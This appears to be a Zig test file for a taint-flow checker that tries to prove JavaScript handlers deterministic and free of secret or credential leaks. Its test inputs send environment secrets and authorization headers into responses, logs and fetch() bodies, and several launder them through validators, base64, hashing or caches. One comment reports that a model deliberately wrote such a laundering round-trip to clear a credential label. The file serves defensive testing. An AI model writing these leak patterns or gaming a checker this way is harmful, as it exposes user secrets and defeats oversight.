/// Run the flow checker over `source` and report whether it still proves
/// `deterministic`.
fn runDeterministic(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().deterministic;
}

test "a clock-derived value reaching the response costs determinism" {
    // The case the capability heuristic cannot see. `cacheGet` returns a value
    // the store may answer differently on a later run, and the label follows it
    // through the binding into the response body.
    const source =
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", "v");
        \\  const seen = cacheGet("ns", "k");
        \\  return Response.json({ seen: seen });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read that never reaches the response keeps determinism" {
    // `logInfo` reads the clock for its timestamp and returns nothing that is
    // used, so no label reaches the response sink. This is the false negative
    // the interim capability rule had to special-case; here it falls out of the
    // flow rather than out of a rule about write effects.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", {});
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a handler touching no varying source keeps determinism" {
    const source =
        \\function handler(req) { return Response.json({ ok: true }); }
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a row read out of the database costs determinism" {
    // `zttp:sql` declares `.sqlite` and `.policy_check` and no clock, so the
    // capability rule saw nothing varying and this handler proved
    // `deterministic` while the row it returns is whatever the last write left
    // in the table. A read from mutable module state is the second varying
    // source, and it is the one no capability set can express.
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  const row = sqlOne("getUser");
        \\  return Response.json({ row: row });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "cache counters in the response cost determinism" {
    // `cacheStats` reads no clock: it sums counters the store already holds.
    // Before the rows were tightened it was demoted anyway, because
    // `zttp:cache` declared `.clock` at module level for the expiry checks in
    // `cacheGet`. The verdict was right and the reason was an accident, so
    // making the row truthful had to come with the rule that really covers it.
    const source =
        \\import { cacheStats } from "zttp:cache";
        \\function handler(req) {
        \\  return Response.json({ stats: cacheStats() });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a compiled schema is not a varying source" {
    // `zttp:validate` is stateful too, but its state is a schema registry the
    // handler compiles from literals inside its own run, so `validateJson`
    // answers the same way every time. Demoting it would be a false negative on
    // the most common validation path, which is why the rule keys on a `.read`
    // effect rather than on `stateful` alone.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.ok });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

// A parsing export answers with its own declared labels, so for a long time it
// dropped everything its argument carried. Any label laundered through one:
// `env("JWT_SECRET")` routed through `validateJson` and returned in the body
// proved `no_secret_leakage`. Found by a model, which wrote the shape
// deliberately during a codegen recording and said in its own commentary that
// it did so to clear the credential label. See
// docs/solutions/security-issues/validate-json-strips-the-label-it-was-asked-to-check.md.
//
// The rule now: such an export discharges `user_input` and nothing else.

test "validateJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = validateJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "coerceJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { schemaCompile, coerceJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("s", "{}");
        \\  const r = coerceJson("s", env("JWT_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "decodeJson does not launder a secret" {
    // A second module, which is what makes this a rule about the shape of an
    // export rather than a defect in one row of one registry.
    const source =
        \\import { env } from "zttp:env";
        \\import { decodeJson } from "zttp:decode";
        \\function handler(req) {
        \\  const r = decodeJson(env("JWT_SECRET"), "");
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "escapeHtml does not launder a secret" {
    // Escaping defends against injection. It does not make a secret public.
    const source =
        \\import { env } from "zttp:env";
        \\import { escapeHtml } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: escapeHtml(env("JWT_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "validateJson does not launder a credential" {
    // The shape the model actually wrote: verified claims round-tripped
    // through the validator to clear the `credential` label.
    const source =
        \\import { env } from "zttp:env";
        \\import { parseBearer, jwtVerify } from "zttp:auth";
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("claims", "{}");
        \\  const result = jwtVerify(parseBearer(req.headers["authorization"]), env("JWT_SECRET"));
        \\  const claims = validateJson("claims", JSON.stringify(result.value));
        \\  return Response.json({ claims: claims.value });
        \\}
    ;
    try std.testing.expect(!try runNoCredentialLeakage(std.testing.allocator, source));
}

test "a validator still discharges user input" {
    // The discharge is the one label these exports are entitled to clear, and
    // the fix must not take it away: this is the ordinary validation path, and
    // demoting it would make every validated handler unprovable.
    const source =
        \\import { schemaCompile, validateJson } from "zttp:validate";
        \\function handler(req) {
        \\  schemaCompile("user", "{}");
        \\  const r = validateJson("user", req.body);
        \\  return Response.json({ ok: r.value });
        \\}
    ;
    try std.testing.expect(try runInputValidated(std.testing.allocator, source));
}

// The same conflation, one module further on, and without the discharge that
// made the validator family arguable: a dictionary holds what was put in it,
// and a JSON document is its input in another shape. Both modules declared no
// labels at all, so both answered the empty set and every label the argument
// carried was dropped. Measured before the fix: the first of these proved
// `no_secret_leakage` with the secret in the response body.

test "a dictionary does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", env("API_SECRET"));
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "stringifyJson does not launder a secret" {
    const source =
        \\import { env } from "zttp:env";
        \\import { stringifyJson } from "zttp:json";
        \\function handler(req) {
        \\  const r = stringifyJson(env("API_SECRET"));
        \\  return Response.json({ v: r.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sseEvents does not launder a secret through its success arm" {
    const source =
        \\import { env } from "zttp:env";
        \\import { sseEvents } from "zttp:sse";
        \\function handler(req) {
        \\  const framed = sseEvents(env("PROVIDER_SECRET"), {
        \\    maxBodyBytes: 8388608,
        \\    maxBlockBytes: 8388608,
        \\    maxEvents: 65536,
        \\  });
        \\  return Response.json({ events: framed.value });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sseEvents does not launder a secret through its error offset" {
    const source =
        \\import { env } from "zttp:env";
        \\import { sseEvents } from "zttp:sse";
        \\function handler(req) {
        \\  const framed = sseEvents(env("PROVIDER_SECRET"), {
        \\    maxBodyBytes: 8388608,
        \\    maxBlockBytes: 8388608,
        \\    maxEvents: 65536,
        \\  });
        \\  return Response.json({ offset: framed.error.offset });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "base64Encode does not launder a secret" {
    // The sharpest row of the family: the output is the input, in another
    // alphabet. Nothing about it is even arguably a declassification.
    const source =
        \\import { env } from "zttp:env";
        \\import { base64Encode } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: base64Encode(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "sha256 does not launder a secret" {
    // The arguable row, and marked for the reason it is arguable. A hash is
    // one-way, so "it is safe now" is available to say - and neither this
    // registry nor the analysis can check it, while an unsalted hash of a
    // low-entropy secret is recoverable. A declassification is spelled by an
    // export that declares what it clears, the way `mask` does below.
    const source =
        \\import { env } from "zttp:env";
        \\import { sha256 } from "zttp:crypto";
        \\function handler(req) {
        \\  return Response.json({ v: sha256(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a text transform does not launder a secret" {
    // A second module, and one nobody would think of as a security boundary,
    // which is the point: the shape is what decides, not the module's subject.
    const source =
        \\import { env } from "zttp:env";
        \\import { slugify } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: slugify(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask still declassifies, because that is what it is for" {
    // The deliberate declassifier, pinned so the sweep that marked its
    // neighbours cannot quietly take it with them. `mask` exists to make a
    // secret printable; an export that unioned its input back in would have no
    // reason to exist.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: mask(env("API_SECRET"), 4) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "the direct return of a secret is refused" {
    // The control for the two probes below. Without it a `false` from either
    // one could mean the harness refuses everything, which would make the
    // probe pass while checking nothing.
    const source =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  return Response.json({ v: env("API_SECRET") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and read back is not proven clean" {
    // The read call holds no reference to what the write put there, so the
    // checker cannot follow the provenance - and the export answered with a
    // benign `.internal` label rather than with ignorance. That reported
    // `no_secret_leakage` PROVEN for a secret round-tripped through the store.
    //
    // `derives_from_args` is the WRONG fix here and is a no-op:
    // `argDerivedLabels` unions only the current call's own arguments, which
    // for `cacheGet("ns", "k")` are two string literals - never the secret a
    // separate `cacheSet` wrote. The primitive that fits is `.unknown`.
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheGet } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheGet("ns", "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row read is not proven clean" {
    const source =
        \\import { sqlOne } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ row: sqlOne("getUser") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql row set read is not proven clean" {
    const source =
        \\import { sqlMany } from "zttp:sql";
        \\function handler(req) {
        \\  return Response.json({ rows: sqlMany("listUsers") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and read back by cacheIncr is not proven clean" {
    // The same shape as `cacheGet`: the number is the stored value parsed
    // back, and the call holds no reference to what wrote it. The control
    // above returns the secret directly and is refused, so a `false` here
    // does not mean the harness refuses everything.
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheIncr } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheIncr("ns", "k", 0) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and probed by cacheDelete is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheDelete } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheDelete("ns", "k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a secret written to the cache and measured by cacheStats is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { cacheSet, cacheStats } from "zttp:cache";
        \\function handler(req) {
        \\  cacheSet("ns", "k", env("API_SECRET"));
        \\  return Response.json({ v: cacheStats("ns") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a rate-limit key reset result is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { rateCheck, rateReset } from "zttp:ratelimit";
        \\function handler(req) {
        \\  const seen = rateCheck(env("API_SECRET"), 10, 60);
        \\  return Response.json({ v: rateReset("k") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a sql write result is not proven clean" {
    const source =
        \\import { env } from "zttp:env";
        \\import { sqlExec } from "zttp:sql";
        \\function handler(req) {
        \\  const saved = sqlExec("saveSecret", { v: env("API_SECRET") });
        \\  return Response.json({ v: sqlExec("purge") });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "a rate-limit counter is still proven clean" {
    // The control that keeps the sweep honest. `rateCheck` declares
    // `.internal` in the same shape as the five store reads, and is correctly
    // excluded: it returns a counter derived from the limiter's own state, and
    // no caller ever writes a value into it. Marking it `.unknown` would cost
    // every rate-limited handler three properties for no provenance gap.
    const source =
        \\import { rateCheck } from "zttp:ratelimit";
        \\function handler(req) {
        \\  return Response.json({ allowed: rateCheck("ip", 10, 60) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with a request-controlled bound declassifies nothing" {
    // `mask` reveals the trailing `visible` bytes, so `visible` decides how
    // much of the secret survives. It was an unbounded runtime `.number`, and
    // the pinning test above only ever passed a literal 4 - so a bound read
    // off the request handed the caller a dial on the declassification.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\import { bytesLength } from "zttp:bytes";
        \\function handler(req) {
        \\  const n = bytesLength(requestBody(req));
        \\  return Response.json({ v: mask(env("API_SECRET"), n) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with a computed bound declassifies nothing either" {
    // Not only request-derived bounds: the question is whether the magnitude
    // is fixed at compile time, and an identifier bound to anything is not.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const n = 4 + 4;
        \\  return Response.json({ v: mask(env("API_SECRET"), n) });
        \\}
    ;
    try std.testing.expect(!try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with its default bound still declassifies" {
    // The argument is optional and the default is fixed at compile time, so
    // omitting it is as bounded as writing the literal.
    const source =
        \\import { env } from "zttp:env";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  return Response.json({ v: mask(env("API_SECRET")) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "mask with a literal bound on a secret into a log holds no_secret_leakage" {
    const source =
        \\import { env } from "zttp:env";
        \\import { logInfo } from "zttp:log";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  logInfo(mask(env("API_TOKEN") ?? "", 4), { n: 1 });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(properties.no_secret_leakage);
}

test "mask with a literal bound on a credential into a log holds no_credential_leakage" {
    const source =
        \\import { logInfo } from "zttp:log";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  logInfo(mask(req.headers["authorization"] ?? "", 4), { n: 1 });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    try std.testing.expect(try runNoCredentialLeakage(std.testing.allocator, source));
}

test "mask keeps user_input: request text through it into an egress body is refused" {
    // `mask` discharges secret and credential and nothing else. Masked request
    // text is still request text, so it reaches the egress body unvalidated.
    const source =
        \\import { fetch } from "zttp:fetch";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/x", { method: "POST", body: mask(req.url, 4) });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    var buf: [256]u8 = undefined;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.injection_safe);
}

test "mask with a runtime bound on a secret into a log is refused" {
    const source =
        \\import { env } from "zttp:env";
        \\import { logInfo } from "zttp:log";
        \\import { mask } from "zttp:text";
        \\function handler(req) {
        \\  const t = env("API_TOKEN") ?? "";
        \\  logInfo(mask(t, t.length), { n: 1 });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const properties = try runFlowProperties(std.testing.allocator, source);
    try std.testing.expect(!properties.no_secret_leakage);
}

test "ordinary text through the same exports still proves clean" {
    // The control for the whole sweep. Propagating every argument label is only
    // useful if it does not refuse the handlers these modules exist for.
    const source =
        \\import { sha256 } from "zttp:crypto";
        \\import { slugify } from "zttp:text";
        \\import { urlEncode } from "zttp:url";
        \\function handler(req) {
        \\  const title = "hello world";
        \\  return Response.json({ a: sha256(title), b: slugify(title), c: urlEncode(title) });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a dictionary of ordinary data still proves clean" {
    // The control. Propagating every argument label is only useful if it does
    // not refuse the handlers the module exists for: nothing labelled goes in
    // here, so nothing labelled comes out.
    const source =
        \\import { dictEmpty, dictSet, dictGet } from "zttp:collections";
        \\function handler(req) {
        \\  const d = dictSet(dictEmpty(), "k", "v");
        \\  return Response.json({ v: dictGet(d, "k") });
        \\}
    ;
    try std.testing.expect(try runNoSecretLeakage(std.testing.allocator, source));
}

test "a clock read reaching the response costs determinism" {
    // `Date.now()` is a global member call, so it carries no import to seed a
    // label from. The label is attached to the read itself and follows the
    // binding into the response body.
    const source =
        \\function handler(req) {
        \\  const at = Date.now();
        \\  return Response.json({ at: at });
        \\}
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a random draw reaching the response costs determinism" {
    const source =
        \\function handler(req) { return Response.json({ roll: Math.random() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a clock read reaching only a log keeps determinism" {
    // The direction the capability rule cannot express: the timestamp reaches
    // stderr and stops, so the two runs answer the same body.
    const source =
        \\import { logInfo } from "zttp:log";
        \\function handler(req) {
        \\  logInfo("served", { at: Date.now() });
        \\  return Response.json({ ok: true });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "a clock read behind a helper reaches the response" {
    // The call summary collects the helper's return labels, so the read does
    // not launder through a wrapper the way it would if only the handler body
    // were walked.
    const source =
        \\function stamp() { return Date.now(); }
        \\function handler(req) { return Response.json({ at: stamp() }); }
    ;
    try std.testing.expect(!try runDeterministic(std.testing.allocator, source));
}

test "a shadowed Date does not carry the varying label" {
    // `Date` here is a local object, not the global, so its `now()` is whatever
    // the handler defined. Labelling it would demote a handler that is in fact
    // deterministic.
    const source =
        \\function handler(req) {
        \\  const Date = { now: () => 7 };
        \\  return Response.json({ at: Date.now() });
        \\}
    ;
    try std.testing.expect(try runDeterministic(std.testing.allocator, source));
}

test "no flow diagnostic offers a repair a guard cannot perform" {
    // Every kind in this checker reports that a labelled value reached a sink.
    // The label is what fails the proof, and `insert_guard_before_line` inserts
    // a conditional - it cannot remove a label, and `.validated` is conferred
    // only by a validator call (validateJson, validateObject, schemaCompile),
    // never by an `if`. So every repair intent this checker
    // offered was one that could not clear the diagnostic offering it.
    //
    // That was survivable while the intent never reached the model. Once
    // diagnostics started carrying `repair_intent` to the agent, a recorded
    // case spent its whole attempt budget on it: "Hmm, what does
    // insert_guard_before_line mean for secret taint? Possibly wrapping the
    // response in a branch that verifies the secret? No..." and "A guard before
    // line 24: e.g., check `values.appName === undefined`? That doesn't remove
    // taint." A wrong repair is worse than none, because none is silent.
    //
    // Read off diagnostics the checker emitted, not off a struct this test
    // built. An earlier version constructed its own `Diagnostic` literal per
    // enum member and asserted `repair_intent == null` on it: that field's
    // declared default is null, so the loop asserted the struct default and
    // would have passed with every emission site in this file setting an
    // intent. `kindsTrippedByProbeCorpus` runs the checker instead, and its
    // coverage floor below fails when a kind stops being reachable - a corpus
    // that trips nothing must not read as a pass.
    var seen = std.EnumSet(DiagnosticKind).empty;
    for (repair_intent_probe_corpus) |source| {
        try collectFlowDiagnosticKinds(std.testing.allocator, source, &seen);
    }
    inline for (@typeInfo(DiagnosticKind).@"enum".field_names) |field| {
        const kind = @field(DiagnosticKind, field);
        if (!seen.contains(kind)) {
            std.debug.print("no probe source trips flow kind '{s}'\n", .{field});
            return error.FlowProbeCorpusMissesKind;
        }
    }
}

/// One handler per `DiagnosticKind`, so the probe above reads a real emission
/// for every member of the enum rather than a default it wrote itself.
const repair_intent_probe_corpus = [_][]const u8{
    // secret_in_response
    \\import { env } from "zttp:env";
    \\function handler(req) { return Response.json({ v: env("SECRET_KEY") }); }
    ,
    // credential_in_response
    \\function handler(req) { return Response.json({ v: req.headers.authorization }); }
    ,
    // secret_in_log
    \\import { env } from "zttp:env";
    \\function handler(req) {
    \\  console.log(env("SECRET_KEY"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_log
    \\function handler(req) {
    \\  console.log(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_url
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(env("SECRET_URL"));
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_egress_url
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch(req.headers.authorization);
    \\  return Response.json({ ok: true });
    \\}
    ,
    // secret_in_egress_body
    \\import { env } from "zttp:env";
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: env("SECRET_KEY") });
    \\  return Response.json({ ok: true });
    \\}
    ,
    // credential_in_egress_body
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: req.headers.authorization });
    \\  return Response.json({ ok: true });
    \\}
    ,
    // unvalidated_input_in_egress
    \\import { fetch } from "zttp:fetch";
    \\function handler(req) {
    \\  fetch("https://api.example.com/v1", { body: req.body });
    \\  return Response.json({ ok: true });
    \\}
    ,
};

/// Run the FlowChecker over `source`, record which kinds it emitted, and refuse
/// any diagnostic that carries a repair intent.
fn collectFlowDiagnosticKinds(
    allocator: std.mem.Allocator,
    source: []const u8,
    seen: *std.EnumSet(DiagnosticKind),
) !void {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    for (checker.getDiagnostics()) |diagnostic| {
        seen.insert(diagnostic.kind);
        if (diagnostic.repair_intent != null) {
            std.debug.print(
                "flow kind '{s}' carries a repair intent\n",
                .{@tagName(diagnostic.kind)},
            );
            return error.FlowDiagnosticOffersUnperformableRepair;
        }
    }
}

test "FlowChecker reports every property unproven before check runs" {
    const source = "function handler(req) { return Response.text(\"ok\"); }";
    var parser = try @import("zts-engine").parser.JsParser.init(std.testing.allocator, source);
    var atoms = atom_table.AtomTable.init(std.testing.allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    _ = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    var checker = FlowChecker.init(std.testing.allocator, ir_view, &atoms);
    defer checker.deinit();
    const properties = checker.getProperties();
    inline for (@typeInfo(FlowProperties).@"struct".field_names) |field| {
        try std.testing.expect(!@field(properties, field));
    }
}
